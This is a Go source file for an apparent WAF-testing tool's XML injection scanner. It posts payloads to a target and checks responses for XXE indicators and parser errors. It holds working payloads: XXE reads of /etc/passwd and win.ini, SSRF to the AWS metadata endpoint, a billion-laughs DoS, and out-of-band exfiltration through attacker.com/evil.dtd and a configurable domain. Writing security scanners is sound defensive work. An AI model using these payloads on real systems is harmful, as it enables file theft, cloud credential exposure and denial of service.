// Package xmlinjection provides XML injection testing
package xmlinjection

import (
	"context"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/waftester/waftester/pkg/iohelper"
)

// Config configures XML injection testing
type Config struct {
	Concurrency int
	Timeout     time.Duration
	Headers     map[string]string
	OOBDomain   string
}

// DefaultConfig returns sensible defaults
func DefaultConfig() Config {
	return Config{
		Concurrency: 10,
		Timeout:     15 * time.Second,
	}
}

// Result represents an XML injection test result
type Result struct {
	URL          string
	Parameter    string
	Payload      string
	PayloadType  string
	StatusCode   int
	ResponseSize int
	Vulnerable   bool
	Evidence     string
	Severity     string
	Timestamp    time.Time
}

// Scanner performs XML injection testing
type Scanner struct {
	config  Config
	client  *http.Client
	results []Result
	mu      sync.RWMutex
}

// NewScanner creates a new XML injection scanner
func NewScanner(config Config) *Scanner {
	if config.Concurrency <= 0 {
		config.Concurrency = 10
	}
	if config.Timeout <= 0 {
		config.Timeout = 15 * time.Second
	}

	return &Scanner{
		config: config,
		client: &http.Client{
			Timeout: config.Timeout,
		},
		results: make([]Result, 0),
	}
}

// Scan tests a URL for XML injection
func (s *Scanner) Scan(ctx context.Context, targetURL string) ([]Result, error) {
	results := make([]Result, 0)

	for _, payload := range Payloads() {
		result := s.testPayload(ctx, targetURL, payload)
		if result.Vulnerable {
			results = append(results, result)
		}
	}

	s.mu.Lock()
	s.results = append(s.results, results...)
	s.mu.Unlock()

	return results, nil
}

// Payload represents an XML injection payload
type Payload struct {
	Value       string
	Type        string
	Description string
}

func (s *Scanner) testPayload(ctx context.Context, targetURL string, payload Payload) Result {
	result := Result{
		URL:         targetURL,
		Payload:     payload.Value,
		PayloadType: payload.Type,
		Timestamp:   time.Now(),
	}

	req, err := http.NewRequestWithContext(ctx, "POST", targetURL, strings.NewReader(payload.Value))
	if err != nil {
		return result
	}

	req.Header.Set("Content-Type", "application/xml")
	for k, v := range s.config.Headers {
		req.Header.Set(k, v)
	}

	resp, err := s.client.Do(req)
	if err != nil {
		return result
	}
	defer resp.Body.Close()

	body, _ := iohelper.ReadBodyDefault(resp.Body)
	result.StatusCode = resp.StatusCode
	result.ResponseSize = len(body)

	result.Vulnerable, result.Evidence = s.detectVulnerability(string(body), payload)
	if result.Vulnerable {
		result.Severity = "HIGH"
		if payload.Type == "xxe" {
			result.Severity = "CRITICAL"
		}
	}

	return result
}

// detectVulnerability checks for XML injection indicators
func (s *Scanner) detectVulnerability(body string, payload Payload) (bool, string) {
	// Check for XXE indicators
	if payload.Type == "xxe" {
		xxeIndicators := []string{
			"root:",
			"/etc/passwd",
			"[CDATA[",
			"SYSTEM",
		}
		for _, ind := range xxeIndicators {
			if strings.Contains(body, ind) {
				return true, "XXE indicator: " + ind
			}
		}
	}

	// Check for XML error messages
	errorPatterns := []string{
		"XML Parsing Error",
		"XMLSyntaxError",
		"SAXParseException",
		"invalid xml",
		"not well-formed",
		"parser error",
		"XML declaration not finished",
		"EntityRef",
		"PCDATA invalid",
	}

	bodyLower := strings.ToLower(body)
	for _, pattern := range errorPatterns {
		if strings.Contains(bodyLower, strings.ToLower(pattern)) {
			return true, "XML error: " + pattern
		}
	}

	return false, ""
}

// GetResults returns all results
func (s *Scanner) GetResults() []Result {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return append([]Result{}, s.results...)
}

// Payloads returns XML injection payloads
func Payloads() []Payload {
	return []Payload{
		// XXE - File Disclosure
		{
			Value:       `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
			Type:        "xxe",
			Description: "XXE file disclosure",
		},
		{
			Value:       `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>`,
			Type:        "xxe",
			Description: "XXE Windows file disclosure",
		},

		// XXE - SSRF
		{
			Value:       `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>`,
			Type:        "xxe-ssrf",
			Description: "XXE AWS metadata SSRF",
		},

		// Billion Laughs (DoS)
		{
			Value:       `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>`,
			Type:        "billion-laughs",
			Description: "XML Billion Laughs DoS",
		},

		// Parameter Entity
		{
			Value:       `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo>test</foo>`,
			Type:        "xxe-param",
			Description: "XXE parameter entity",
		},

		// XInclude
		{
			Value:       `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`,
			Type:        "xinclude",
			Description: "XInclude file disclosure",
		},

		// CDATA injection
		{
			Value:       `<data><![CDATA[<script>alert('XSS')</script>]]></data>`,
			Type:        "cdata",
			Description: "CDATA injection",
		},

		// Malformed XML
		{
			Value:       `<?xml version="1.0"?><data><item>test</item><item>unclosed`,
			Type:        "malformed",
			Description: "Malformed XML",
		},

		// Comment injection
		{
			Value:       `<data>test<!-- comment -->injection</data>`,
			Type:        "comment",
			Description: "XML comment injection",
		},
	}
}

// XXEPayloads returns XXE-specific payloads
func XXEPayloads(oobDomain string) []Payload {
	return []Payload{
		{
			Value:       `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://` + oobDomain + `/?data=test">]><foo>&xxe;</foo>`,
			Type:        "xxe-oob",
			Description: "XXE OOB exfiltration",
		},
		{
			Value:       `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://` + oobDomain + `/evil.dtd">%dtd;]><foo>test</foo>`,
			Type:        "xxe-oob-param",
			Description: "XXE OOB with parameter entity",
		},
	}
}

// SoapPayloads returns SOAP-specific XML injection payloads
func SoapPayloads() []Payload {
	return []Payload{
		{
			Value:       `<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data></soapenv:Body></soapenv:Envelope>`,
			Type:        "soap-xxe",
			Description: "SOAP XXE injection",
		},
	}
}
